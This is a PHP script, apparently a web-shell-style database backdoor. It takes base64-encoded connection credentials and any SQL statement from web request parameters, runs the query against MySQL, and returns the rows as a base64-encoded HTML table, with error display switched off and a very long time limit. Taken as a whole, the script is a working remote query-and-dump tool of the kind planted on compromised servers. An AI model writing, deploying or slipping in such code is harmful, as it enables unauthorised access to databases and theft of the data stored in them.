<?php
error_reporting(E_ALL);
ini_set('display_errors', FALSE);
set_time_limit (100000);

function mysqli_result($res, $row, $field=0) {
    $res->data_seek($row);
    $datarow = $res->fetch_array();
    return $datarow[$field];
}

$connect_host = $_REQUEST['connect_host'];
$connect_id = $_REQUEST['connect_id'];
$connect_pass =	$_REQUEST['connect_pass'];
$db_name = $_REQUEST['db_name'];
$tb_name=$_REQUEST['tb_name'];
$limit=$_REQUEST['limit'];
$f_flag=$_REQUEST['f_flag'];
$bak_dir=$_REQUEST['bak_dir'];

if(isset($tb_name))
	$tb_name=base64_decode($tb_name);
	
if(isset($connect_host)) $connect_host=base64_decode($connect_host);
	else $connect_host="localhost";
if(isset($connect_id)) $connect_id=base64_decode($connect_id);
	else $connect_id="";
if(isset($connect_pass)) $connect_pass=base64_decode($connect_pass);
	else $connect_pass="";

if(isset($db_name)) $db_name=base64_decode($db_name);
	else $db_name="d7_phone";

	if(isset($limit)) $lim=$limit;
		else $lim=0;
	if(isset($f_flag)) $f_flag=1;
		else $f_flag=0;
	if(isset($bak_dir)) $bak_dir=base64_decode($bak_dir);
		else $bak_dir="/back.sql";

	$query=$tb_name;
	$mysqli = new mysqli($connect_host,$connect_id,$connect_pass,$db_name) or die("connect error.");
	   
	$out_str="";
	$result_k = $mysqli->query($query,$conn);
	$result_row = mysqli_num_rows($result_k);
	
	$result_field=$result_k->field_count;

	if($result_row==0 or $result_row==''){
	    echo  base64_encode("No Result.");
	    exit;
	}
	{
		$out_str=$out_str."Row Count=".$result_row."<br>";
		$out_str=$out_str. "<table border=1><tr>";
	}
	while ($fieldinfo = $result_k -> fetch_field()) {
		$out_str=$out_str."<td>".$fieldinfo -> name."</td>";
	}

	$out_str=$out_str."</tr>";
	if ($lim<>0 && $lim<$result_row) $result_row=$lim;
	for($i=0;$i<$result_row;$i++){
		$out_str=$out_str."<tr>";
	    for($j=0;$j<$result_field;$j++){
			$out_str=$out_str."<td>".mysqli_result($result_k,$i,$j)."</td>";
	      }
		$out_str=$out_str."</tr>";
	}
	$out_str=$out_str."</table>";

	echo  base64_encode($out_str);
	mysqli_free_result($result_k);
	mysqli_close($connect);
	exit;
?>